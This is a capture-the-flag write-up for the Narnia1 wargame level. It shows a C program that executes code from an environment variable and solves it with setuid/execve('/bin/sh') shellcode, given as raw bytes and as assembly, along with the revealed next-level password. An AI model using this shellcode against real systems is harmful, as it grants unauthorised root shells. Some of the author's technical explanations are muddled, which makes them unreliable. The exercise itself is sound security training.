# Narnia1

```C
#include <stdio.h>

int main(){
  int (*ret)();

  if(getenv("EGG")==NULL){    
  	printf("Give me something to execute at the env-variable EGG\n");
  	exit(1);
  }

  printf("Trying to execute EGG!\n");
  ret = getenv("EGG");
  ret();

  return 0;
}
```
The C code here seems to use the  function `getenv()` to get the function pointer at the environmental variable `EGG`. (Also as a challenge what happens if we do not set EGG?)

So lets make an environmental variable. To do that do:

```
$ export EGG="dogs_are_cool"
$ echo $EGG
dogs_are_cool
```

Now we need to set as a function. However you can't make and compile a C program because to much overhead and can be complicated in referring the address of the C function. We need `SHELLCODE`. Shellcode is x86 assembly code that when compiled and given as input will spawn a shell for our use.

So lets create a simple shellcode program `shellcode.s`. Need `.s` extension so `nasm` compiles it as a lightweight machine code instead of an executable.

```
SHELLCODE ASSEMBLY DOES NOT WORK AT THE MOMENT and still needs testing
```

Instead use the precompiled shellcode: `"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"`

Was gotten from the [exploit db](https://www.exploit-db.com/exploits/13333/)

We also got this  assembly but it does not work.
```assembly
global _start
section .text
_start:
;setuid(0)
xor ebx,ebx
lea eax,[ebx+0x17]
cdq
int 0x80
;execve("/bin/sh",0,0)
xor ecx,ecx
push ecx
push 0x68732f6e
push 0x69622f2f
lea eax,[ecx+0x0B]
mov ebx,esp
int 0x80
```

To get it into EGG use python command line and put $() around it.

```
THIS ASSEMLBY WORKS
```
When you run this it works. It requires some tweaking from the previous assembly:
```assembly
BITS 64 ; need this so that nasm can put it as a flat form binary but default is 32 so need to specify 64 bits (for the r registers)

global _start ; this
section .text ;  and this are both labels to set up the code portion of the code
_start: ; start here label
;setuid(0) this is to escalate priviledges in the environment
xor ebx,ebx        ; zero out ebx (the first argument) to be 0
lea eax,[rbx+0x17] ; move the value 23 as dword
cdq                ; since the rbx is bigger than eax need to extend Convert Double  word into Quadword
int 0x80           ; syscall (for MIPS people)

;execve("/bin/sh",0,0)
xor ecx,ecx        ; the 2nd argument (ecx) is zero
push rcx           ; idk why rcx just needs dword
push 0x68732f6e    ; the hex value of 'n/sh' is now on stack
push 0x69622f2f    ; the hex value of '//bi' is now on stack
lea eax,[rcx+0x0B] ; execute syscall 0xb or 11
mov ebx,esp        ; have the 1st argument be what is on the stack
int 0x80           ; syscall
or bh, bh          ; idk what this does
```

Okay so with assembly the lets say the we want to execute `funct1("hello", 0)`. The value for eax is the number in the unistd.h file to execute the system call `funct1`. ebx would need to have the value "hello" but since it is not zero it has to have the structor of a reach register (ones that start with r) instead of an extended register (one that starts with e). Now since the 2nd argument is zero we just need ecx to be zero as well.

Ok to compile use:
```
$ nasm shellcode.s
$ wc -c shellcode
30 <-- good that it is around 30 use premade shellcode to compare with hexdump
```

Now export the value in `shellcode` into EGG and run the program. You should get a shell, that has access to narnia2 password.

Password: `nairiepecu`
